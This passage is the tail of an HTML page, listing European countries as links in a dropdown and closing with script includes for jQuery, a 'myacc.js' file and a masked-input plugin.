                                    <li> <a href="#" class="country HR">Croatia</a></li>
                                    <li> <a href="#" class="country CY">Cyprus</a></li>
                                    <li> <a href="#" class="country CZ">Czech Republic</a></li>
                                    <li> <a href="#" class="country DK">Denmark</a></li>
                                    <li> <a href="#" class="country EE">Estonia</a></li>
                                    <li> <a href="#" class="country FO">Faroe Islands</a></li>
                                    <li> <a href="#" class="country FI">Finland</a></li>
                                    <li> <a href="#" class="country FR">France</a></li>
                                    <li> <a href="#" class="country GE">Georgia</a></li>
                                    <li> <a href="#" class="country DE">Germany</a></li>
                                    <li> <a href="#" class="country GI">Gibraltar</a></li>
                                    <li> <a href="#" class="country GR">Greece</a></li>
                                    <li> <a href="#" class="country HU">Hungary</a></li>
                                    <li> <a href="#" class="country IS">Iceland</a></li>
                                    <li> <a href="#" class="country IE">Ireland</a></li>
                                    <li> <a href="#" class="country IT">Italy</a></li>
                                    <li> <a href="#" class="country LV">Latvia</a></li>
                                    <li> <a href="#" class="country LI">Liechtenstein</a></li>
                                    <li> <a href="#" class="country LT">Lithuania</a></li>
                                    <li> <a href="#" class="country LU">Luxembourg</a></li>
                                    <li> <a href="#" class="country MK">Macedonia</a></li>
                                    <li> <a href="#" class="country MT">Malta</a></li>
                                    <li> <a href="#" class="country MD">Moldova</a></li>
                                    <li> <a href="#" class="country MC">Monaco</a></li>
                                    <li> <a href="#" class="country ME">Montenegro</a></li>
                                    <li> <a href="#" class="country NL">Netherlands</a></li>
                                    <li> <a href="#" class="country NO">Norway</a></li>
                                    <li> <a href="#" class="country PL">Poland</a></li>
                                    <li> <a href="#" class="country PT">Portugal</a></li>
                                    <li> <a href="#" class="country RO">Romania</a></li>
                                    <li> <a href="#" class="country RU">Russia</a></li>
                                    <li> <a href="#" class="country SM">San Marino</a></li>
                                    <li> <a href="#" class="country RS">Serbia</a></li>
                                    <li> <a href="#" class="country SK">Slovakia</a></li>
                                    <li> <a href="#" class="country SI">Slovenia</a></li>
                                    <li> <a href="#" class="country ES">Spain</a></li>
                                    <li> <a href="#" class="country SJ">Svalbard &amp; Jan Mayen</a></li>
                                    <li> <a href="#" class="country SE">Sweden</a></li>
                                    <li> <a href="#" class="country CH">Switzerland</a></li>
                                    <li> <a href="#" class="country UA">Ukraine</a></li>
                                    <li> <a href="#" class="country GB">United Kingdom</a></li>
                                    <li> <a href="#" class="country VA">Vatican City</a></li>
                                 </ul>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <script src="asset/js/jquery.min.js"></script> <script src="asset/js/myacc.js"></script> <script src="asset/js/jquery.maskedinput.js"></script> 
   </body>
</html>